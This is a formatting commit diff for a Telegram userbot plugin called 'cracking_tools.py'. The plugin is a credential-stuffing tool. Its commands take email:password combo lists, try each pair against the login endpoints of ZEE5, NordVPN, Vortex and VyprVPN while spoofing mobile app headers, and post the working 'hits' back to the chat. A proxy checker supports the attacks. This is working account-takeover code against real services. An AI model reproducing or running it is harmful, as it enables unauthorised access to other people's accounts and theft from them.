4c5570d36056230a8affaf46b9e4a964702469e4
CipherX <cipherxx1998@gmail.com>
2020-12-26 14:08:41 +0000

    pylint: auto fixes

--- userbot/plugins/cracking_tools.py
+++ userbot/plugins/cracking_tools.py
@@ -1,28 +1,25 @@
-import json
 import os
+
 import requests
 from uniborg.util import friday_on_cmd
+
 from userbot import CMD_HELP
-from userbot.utils import admin_cmd
-from sys import argv
-import urllib3
-import os
+from userbot.utils import admin_cmd, friday_on_cmd
 
-
-from userbot.utils import friday_on_cmd
 data = {
-   "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
-   "Content-Length": "55",
-   "Accept-Encoding":"gzip"
+    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
+    "Content-Length": "55",
+    "Accept-Encoding": "gzip",
 }
 
-data2 = {
-    "accept-encoding": "gzip",
-    "user-agent": "RemotrAndroid/1.5.0"
-}
+data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}
+
+
 @friday.on(friday_on_cmd(pattern="cz5$"))
 async def zee5(event):
-    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
+    await event.edit(
+        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
+    )
     stark_dict = []
     hits_dict = []
     hits = 0
@@ -35,14 +32,16 @@ async def zee5(event):
         stark_dict.append(line)
     os.remove(starky)
     if len(stark_dict) > 50:
-        await event.edit('`Thats A Lot Of Combos. Keep 50 As Limit`')
+        await event.edit("`Thats A Lot Of Combos. Keep 50 As Limit`")
         return
     for i in stark_dict:
         starkm = i.split(":")
         email = starkm[0]
         password = starkm[1]
         try:
-            meke = requests.get(f'https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}').json()
+            meke = requests.get(
+                f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
+            ).json()
         except:
             meke = None
         if meke.get("token"):
@@ -55,61 +54,20 @@ async def zee5(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Hackintush')
+            hitfile.write(s + " | @Hackintush")
     await borg.send_file(
-        event.chat_id, "hits.txt", caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
+        event.chat_id,
+        "hits.txt",
+        caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
     )
     os.remove("hits.txt")
+
 
 @friday.on(friday_on_cmd(pattern="cnd$"))
 async def vypr(event):
-    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
-    stark_dict = []
-    hits_dict = []
-    hits = 0
-    bads = 0
-    lol = await event.get_reply_message()
-    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
-    file = open(starky, "r")
-    lines = file.readlines()
-    for line in lines:
-        stark_dict.append(line)
-    os.remove(starky)
-    if len(stark_dict) > 50:
-        await event.edit('`Thats A Lot Of Combos. Keep 50 As Limit`')
-        return
-    for i in stark_dict:
-        starkm = i.split(":")
-        email = starkm[0]
-        password = starkm[1]
-        sedlyf = {
-        "username" : email,
-        "password" : password
-        }
-        try:
-            meke = requests.post(url='https://zwyr157wwiu6eior.com/v1/users/tokens', headers=data, json=sedlyf).json()
-        except Exception as s:
-            meke = None
-            pass
-        if meke.get("token"):
-            hits += 1
-            hits_dict.append(f"{email}:{password}")
-        else:
-            bads += 1
-    if len(hits_dict) == 0:
-        await event.edit("**0 Hits. Probably, You Should Find Better Combos.**")
-        return
-    with open("hits.txt", "w") as hitfile:
-        for s in hits_dict:
-            hitfile.write(s + ' | @Hackintush')
-    await borg.send_file(
-        event.chat_id, "hits.txt", caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
+    await event.edit(
+        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
     )
-    os.remove("hits.txt")
-   
-@friday.on(friday_on_cmd(pattern="cvx$"))
-async def vortex(event):
-    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
     stark_dict = []
     hits_dict = []
     hits = 0
@@ -122,21 +80,21 @@ async def vortex(event):
         stark_dict.append(line)
     os.remove(starky)
     if len(stark_dict) > 50:
-        await event.edit('`Thats A Lot Of Combos. Keep 50 As Limit`')
+        await event.edit("`Thats A Lot Of Combos. Keep 50 As Limit`")
         return
     for i in stark_dict:
         starkm = i.split(":")
         email = starkm[0]
         password = starkm[1]
-        sedlyf = {
-    "email": email,
-    "pass": password
-        }
+        sedlyf = {"username": email, "password": password}
         try:
-            meke = requests.post(url='https://vortex-api.gg/login', headers=data2, json=sedlyf).json()
-        except Exception as s:
+            meke = requests.post(
+                url="https://zwyr157wwiu6eior.com/v1/users/tokens",
+                headers=data,
+                json=sedlyf,
+            ).json()
+        except Exception:
             meke = None
-            pass
         if meke.get("token"):
             hits += 1
             hits_dict.append(f"{email}:{password}")
@@ -147,15 +105,20 @@ async def vortex(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Hackintush')
+            hitfile.write(s + " | @Hackintush")
     await borg.send_file(
-        event.chat_id, "hits.txt", caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
+        event.chat_id,
+        "hits.txt",
+        caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
     )
     os.remove("hits.txt")
 
-@friday.on(friday_on_cmd(pattern="cvr$"))
+
+@friday.on(friday_on_cmd(pattern="cvx$"))
 async def vortex(event):
-    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
+    await event.edit(
+        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
+    )
     stark_dict = []
     hits_dict = []
     hits = 0
@@ -168,26 +131,75 @@ async def vortex(event):
         stark_dict.append(line)
     os.remove(starky)
     if len(stark_dict) > 50:
-        await event.edit('`Thats A Lot Of Combos. Keep 50 As Limit`')
+        await event.edit("`Thats A Lot Of Combos. Keep 50 As Limit`")
+        return
+    for i in stark_dict:
+        starkm = i.split(":")
+        email = starkm[0]
+        password = starkm[1]
+        sedlyf = {"email": email, "pass": password}
+        try:
+            meke = requests.post(
+                url="https://vortex-api.gg/login", headers=data2, json=sedlyf
+            ).json()
+        except Exception:
+            meke = None
+        if meke.get("token"):
+            hits += 1
+            hits_dict.append(f"{email}:{password}")
+        else:
+            bads += 1
+    if len(hits_dict) == 0:
+        await event.edit("**0 Hits. Probably, You Should Find Better Combos.**")
+        return
+    with open("hits.txt", "w") as hitfile:
+        for s in hits_dict:
+            hitfile.write(s + " | @Hackintush")
+    await borg.send_file(
+        event.chat_id,
+        "hits.txt",
+        caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
+    )
+    os.remove("hits.txt")
+
+
+@friday.on(friday_on_cmd(pattern="cvr$"))
+async def vortex(event):
+    await event.edit(
+        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
+    )
+    stark_dict = []
+    hits_dict = []
+    hits = 0
+    bads = 0
+    lol = await event.get_reply_message()
+    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
+    file = open(starky, "r")
+    lines = file.readlines()
+    for line in lines:
+        stark_dict.append(line)
+    os.remove(starky)
+    if len(stark_dict) > 50:
+        await event.edit("`Thats A Lot Of Combos. Keep 50 As Limit`")
         return
     for i in stark_dict:
         starkm = i.split(":")
         email = starkm[0]
         password = starkm[1]
         data = {
-   "username" : email,
-   "password" : password,
-   "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)",
-   "Connection": "close",
-   "locale":"en",
-   "X-GF-PLATFORM":"android",
-   "X-GF-PRODUCT":"vyprvpn",
-   "X-GF-Agent":"VyprVPN Android v2.6.4.3156. (1b33ca24)",
-   "Content-Type" : "application/x-www-form-urlencoded"
+            "username": email,
+            "password": password,
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)",
+            "Connection": "close",
+            "locale": "en",
+            "X-GF-PLATFORM": "android",
+            "X-GF-PRODUCT": "vyprvpn",
+            "X-GF-Agent": "VyprVPN Android v2.6.4.3156. (1b33ca24)",
+            "Content-Type": "application/x-www-form-urlencoded",
         }
         try:
             meke = requests.get(url=noob, headers=data).text
-        except Exception as s:
+        except Exception:
             meke = None
         if "invalid username or password" in meke:
             bads += 1
@@ -200,23 +212,22 @@ async def vortex(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Hackintush')
+            hitfile.write(s + " | @Hackintush")
     await borg.send_file(
-        event.chat_id, "hits.txt", caption=f"**!VYPR HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
+        event.chat_id,
+        "hits.txt",
+        caption=f"**!VYPR HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
     )
     os.remove("hits.txt")
-   
-   
-def find_between( s, first, last ):
+
+
+def find_between(s, first, last):
     try:
-        start = s.index( first ) + len( first )
-        end = s.index( last, start )
+        start = s.index(first) + len(first)
+        end = s.index(last, start)
         return s[start:end]
     except ValueError:
         return ""
-
-
-
 
 
 @friday.on(admin_cmd(pattern="proxy"))
@@ -226,28 +237,34 @@ async def _(event):
     await event.edit("Checking Proxies. Please Wait...")
     pablo = await event.get_reply_message()
     escobar = await borg.download_media(pablo.media, Config.TMP_DOWNLOAD_DIRECTORY)
-    
+
     cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"
-    
+
     os.system(cmd)
-    
-    file = open("goods.txt","r") 
+
+    file = open("goods.txt", "r")
     Counter = 0
-    Content = file.read() 
-    CoList = Content.split("\n") 
-    for i in CoList: 
-      if i: 
-        Counter += 1
+    Content = file.read()
+    CoList = Content.split("\n")
+    for i in CoList:
+        if i:
+            Counter += 1
     file.close()
-    if Counter<=0:
-      await event.edit("Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid.")
-    elif Counter>=1:
-      file1 = open("goods.txt", "a")
-      file1.write("\nChecked By  CɪᴘʜᴇʀX") 
-      file1.close() 
-      await borg.send_file(event.chat_id, "goods.txt", caption=f"**Proxies Checked**\n**Good Proxies: ** {Counter}\n\n**Checked By  CɪᴘʜᴇʀX**")
-      os.remove(escobar)
-      os.remove("goods.txt")
+    if Counter <= 0:
+        await event.edit(
+            "Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid."
+        )
+    elif Counter >= 1:
+        file1 = open("goods.txt", "a")
+        file1.write("\nChecked By  CɪᴘʜᴇʀX")
+        file1.close()
+        await borg.send_file(
+            event.chat_id,
+            "goods.txt",
+            caption=f"**Proxies Checked**\n**Good Proxies: ** {Counter}\n\n**Checked By  CɪᴘʜᴇʀX**",
+        )
+        os.remove(escobar)
+        os.remove("goods.txt")
 
 
 CMD_HELP.update(
@@ -263,5 +280,3 @@ CMD_HELP.update(
 \n**Usage :** Checks for alive proxies."
     }
 )
-
-
